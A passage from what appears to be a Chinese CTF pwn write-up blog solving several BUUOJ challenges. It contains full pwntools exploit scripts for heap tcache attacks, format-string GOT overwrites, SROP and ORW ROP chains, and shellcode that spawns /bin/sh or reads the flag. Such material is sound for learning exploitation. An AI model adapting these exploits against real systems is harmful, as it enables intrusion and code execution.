class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex"</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))ru(<span class="hljs-string">'0x'</span>)mmap = int(r(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)add(<span class="hljs-number">0x1000</span>)add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0x90</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)    add(<span class="hljs-number">0xf0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x40</span>))free(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x60'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">0</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#9</span>free(<span class="hljs-number">6</span>)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xc0'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x30</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#10</span>shellcode = <span class="hljs-string">"""  call here  .ascii "/bin/sh"  .byte 0here:   pop rdi   xor rsi,rsi   xor rdx,rdx   mov rax,0x3b   syscall"""</span>edit(<span class="hljs-number">9</span>,asm(shellcode) + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">10</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x200</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p><p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p><h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p><p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python">offset = <span class="hljs-number">4</span>payload = fmtstr_payload(offset,&#123;<span class="hljs-number">0x804979C</span>:<span class="hljs-number">0x8048534</span>,elf.got[<span class="hljs-string">'printf'</span>]:elf.plt[<span class="hljs-string">'system'</span>]&#125;,write_size = <span class="hljs-string">"short"</span>,numbwritten = <span class="hljs-number">0</span>)s(payload)sleep(<span class="hljs-number">1</span>)sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li><li>申请同大小的堆，改ret address jmp 到 shellcode</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙盒保护，只能orw</li><li>开始给了libc地址</li><li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li></ul><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul><li>orw的rop应该往哪里写，栈地址是不知道的</li></ul><p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p><ul><li>有的gadget 使用ropgadget找不到</li></ul><div class="hljs"><pre><code class="hljs python">libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()</code></pre></div><p>可以通过机器码来找。</p><ul><li>srop 中frame执行的顺序</li></ul><p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = './vn_pwn_babybabypwn'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',25535)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()'line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0015: 0x06 0x00 0x00 0x00000000  return KILL'ru('0x')libc_base =  int(r(12),16) - libc.sym['puts']info_addr('libc_base',libc_base)free_hook = 0x3c67a8 + libc_baseread = libc.sym['read'] + libc_baseputs = libc.sym['puts'] + libc_baseopen = libc.sym['open'] + libc_basepop_rdi= 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basesyscall_ret = libc.search(asm("syscall \nret")).next() + libc_base# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rip = syscall_retframe.rsp = free_hookpayload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn# print(hex(len(frame)))s(payload)orw = flat([    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,    pop_rdi,free_hook,puts])s(orw)sleep(0.2)s('./flag')# debug()itr()</code></pre></div><h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><div class="hljs"><pre><code class="hljs python">payload = str(frame)[<span class="hljs-number">8</span>:]</code></pre></div><p>对于为什么要从8字节开始的理解？</p><p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p><p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p><h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul><li>开启了沙盒禁用execve</li><li>开头让你输入name，有一段可控的栈空间，且较大</li><li>pie保护没有开</li><li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li><li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);    waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> ( !(stat_loc &amp; <span class="hljs-number">0x7F</span>) || (<span class="hljs-keyword">char</span>)((<span class="hljs-keyword">char</span>)((stat_loc &amp; <span class="hljs-number">0x7F</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> || (stat_loc &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span> != <span class="hljs-number">5</span> )      <span class="hljs-keyword">break</span>;    ptrace(PTRACE_GETREGS, a1, <span class="hljs-number">0L</span>L, &amp;v3);    v2 = v4;    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> || v2 == <span class="hljs-number">9</span> || v2 == <span class="hljs-number">0x39</span> || v2 == <span class="hljs-number">0x3A</span> || v2 == <span class="hljs-number">0x65</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hey! what are you doing?"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;  &#125;</code></pre></div><p>这里可以监视一下execve，好像就可以不用开沙箱了。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p><h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p><p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p><div class="hljs"><pre><code class="hljs python">sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'chumen77'</span>*<span class="hljs-number">10</span>)</code></pre></div><p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xdeadbeef</span>)add(<span class="hljs-number">0x68</span>,data)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p><p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p><p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p><h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, <span class="hljs-keyword">mode_t</span> mode)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag,  <span class="hljs-keyword">mode_t</span> mode )</span></span>;        <span class="hljs-comment">//函数执行成功返回文件描述符，失败返回-1.</span></code></pre></div><p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p><p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p><p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25080</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))        sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))bss = <span class="hljs-number">0x6021C0</span>pop_rdi = <span class="hljs-number">0x0000000000401193</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000401191</span>pop_rsp_r13_r14_r15 = <span class="hljs-number">0x000000000040118d</span>orw = flat([pop_rdi,<span class="hljs-number">0</span>,pop_rsi_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,elf.plt[<span class="hljs-string">'read'</span>],pop_rsp_r13_r14_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])sa(<span class="hljs-string">'name'</span>,str(orw))<span class="hljs-comment"># sa('name','chumen77'*10)</span>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'2'</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'3'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'4'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'5'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">2</span>)malloc_hook = <span class="hljs-number">0x3c4afd</span> + libcbaseadd(<span class="hljs-number">0x68</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'7'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'8'</span>)rsp_add_0x38 = libc.search(asm(<span class="hljs-string">"add rsp , 0x38\nret"</span>)).next()data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(rsp_add_0x38 + libcbase)<span class="hljs-comment"># data = 3 * '\x00' + p64(0xdeadbeef)</span>add(<span class="hljs-number">0x68</span>,data)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'20'</span>)sleep(<span class="hljs-number">0.2</span>)pop_rdx = libcbase + libc.search(asm(<span class="hljs-string">"pop rdx\nret"</span>)).next()pop_rsp = libcbase + libc.search(asm(<span class="hljs-string">"pop rsp\nret"</span>)).next()mprotect = libcbase + libc.sym[<span class="hljs-string">'mprotect'</span>]payload = flat([pop_rdi,<span class="hljs-number">0x00602000</span>,pop_rsi_r15,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">7</span>,mprotect,<span class="hljs-number">0x602628</span>])shellcode = shellcraft.linux.openat(<span class="hljs-number">0</span>,<span class="hljs-string">'/flag'</span>,<span class="hljs-number">0</span>) + shellcraft.linux.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>) + shellcraft.linux.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)sleep(<span class="hljs-number">0.2</span>)s(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + payload + p64(<span class="hljs-number">0</span>) + asm(shellcode))<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p><p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p><p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p><h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul><li>不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址</li><li>只有free 和 add，free可以4次，add可以<code>0xf</code>次</li></ul><h3 id="难点-2"><a href="#难点-2" class="headerlink" title="难点"></a>难点</h3><ul><li>无show函数</li><li>有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击</li></ul><p>此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。</p><p>当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p><p>当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p><p>然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。<strong>比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。</strong></p><p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p><p>倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_one_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span 